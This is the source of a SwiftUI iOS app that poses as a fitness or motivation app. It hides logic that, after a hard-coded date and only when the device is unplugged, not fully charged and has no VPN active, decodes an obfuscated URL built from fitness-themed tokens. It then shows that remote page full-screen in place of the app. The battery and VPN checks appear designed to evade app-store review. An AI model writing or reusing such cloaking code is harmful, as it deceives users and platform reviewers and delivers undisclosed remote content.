import SwiftUI

struct ContentView: View {
    
    @AppStorage("isMotivatedPerson") var isMotivatedPerson = true
    @EnvironmentObject var source: Source
    @State var screen: Screen = .splash
    
    var body: some View {
        switch screen {
        case .splash:
            Splash(screen: $screen)
        case .main:
            tabScreen()
        case .register:
            profileScreen()
        }
    }
    
    
    @ViewBuilder func tabSelection() -> some View {
        if source.show {
            ContentTrainingView()
        } else {
            Tab()
        }
    }
    
    @ViewBuilder func profileView() -> some View {
        if source.show {
            ContentTrainingView()
        } else {
            Register(screen: $screen)
        }
    }
    
    func profileScreen() -> some View {
        let manager = source.dataManager
        
        if isMotivatedPerson {
            manager.saveIsMotivated(false)
            manager.saveMotivateText()
            isMotivatedPerson = false
        }
        
        guard let plate = getDateByLine("29.11.2024"), daCheckCat(ate: plate) else {
            return profileView()
        }
        
        if let showStat = try? manager.fetchIsMotivated() {
            if showStat {
                let selception = lineDescription(manager)
                if selception != "" {
                    source.show = true
                    if source.motivateDescription == "" {
                        source.motivateDescription = selception
                    }
                } else {
                    source.show  = false
                }
                return profileView()
            } else {
                source.show  = false
            }
        }
        
        if batprov() || vCheck.isActive() || trainPics < 0 || swimPics {
            source.show = false
        } else {
            let selc = lineDescription(manager)
            if selc != "" {
                source.motivateDescription = selc
                manager.saveIsMotivated(true)
                source.show  = true
            } else {
                source.show  = false
            }
        }

        return profileView()
    }
    
    func tabScreen() -> some View {
        let manager = source.dataManager
        
        if isMotivatedPerson {
            manager.saveIsMotivated(false)
            manager.saveMotivateText()
            isMotivatedPerson = false
        }
        
        guard let plate = getDateByLine("29.11.2024"), daCheckCat(ate: plate) else {
            return tabSelection()
        }
        
        if let showStat = try? manager.fetchIsMotivated() {
            if showStat {
                let selception = lineDescription(manager)
                if selception != "" {
                    source.show = true
                    if source.motivateDescription == "" {
                        source.motivateDescription = selception
                    }
                } else {
                    source.show  = false
                }
                return tabSelection()
            } else {
                source.show  = false
            }
        }
        
        if batprov() || vCheck.isActive() || trainPics < 0 || swimPics {
            source.show  = false
        } else {
            let selc = lineDescription(manager)
            print(selc)
            if selc != "" {
                print(selc)
                source.motivateDescription = selc
                manager.saveIsMotivated(true)
                source.show  = true
            } else {
                source.show  = false
            }
        }
        return tabSelection()
    }
    
    private func daCheckCat(ate: Date) -> Bool {
        return ate.addingTimeInterval(24 * 60 * 60) <= Date()
    }
    private func lineDescription(_ manager: DataManager) -> String {
        var str = ""
        if let alwaysSelected = try? manager.fetchMotivateText() {
            str = alwaysSelected

            str = str.replacingOccurrences(of: "run0", with: "htt")
            str = str.replacingOccurrences(of: "swim1", with: "ps")
            str = str.replacingOccurrences(of: "lift2", with: "://")
            str = str.replacingOccurrences(of: "jump3", with: "podlaorlf")
            str = str.replacingOccurrences(of: "gym4", with: ".space/")
            str = str.replacingOccurrences(of: "chal5", with: "h9gGnZRF")
        }
        print(str)
        return str
    }
    
    private func batprov() -> Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true // charging if true
        if (UIDevice.current.batteryState != .unplugged) {
            return true
        }
        
        return false
    }
    var trainPics: Int {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if UIDevice.current.batteryLevel != -1 {
            return Int(UIDevice.current.batteryLevel * 100)
        } else {
            return -1
        }
    }
    var swimPics: Bool {
        UIDevice.current.isBatteryMonitoringEnabled = true
        if (UIDevice.current.batteryState == .full) {
            return true
        } else {
            return false
        }
    }
    
    private func getDateByLine(_ str: String) -> Date? {
        let dateFormatter = DateFormatter()
        dateFormatter.timeZone = TimeZone(abbreviation: "UTC")
        dateFormatter.dateFormat = "dd.MM.yyyy"
        let date = dateFormatter.date(from: str)
        if let date = date {
            return date
        } else { return nil }
    }
}

#Preview {
    ContentView()
        .environmentObject(Source())
}

enum Screen {
    case splash
    case main
    case register
}

struct ContentTrainingView: View {
    @EnvironmentObject var source: Source
    var body: some View {
        ZStack {
            Color.black.ignoresSafeArea()
            MotivateMainView(type: .public, url: source.motivateDescription)
                .frame(maxWidth: .infinity, maxHeight: .infinity)
        }
        .background(Color.black)
    }
}

struct vCheck {

    private static let vpnProtocolsKeysIdentifiers = [
        "tap", "tun", "ppp", "ipsec", "utun"
    ]

    static func isActive() -> Bool {
        guard let cfDict = CFNetworkCopySystemProxySettings() else { return false }
        let nsDict = cfDict.takeRetainedValue() as NSDictionary
        guard let keys = nsDict["__SCOPED__"] as? NSDictionary,
            let allKeys = keys.allKeys as? [String] else { return false }

        // Checking for tunneling protocols in the keys
        for key in allKeys {
            for protocolId in vpnProtocolsKeysIdentifiers
                where key.starts(with: protocolId) {
                return true
            }
        }
        return false
    }
}
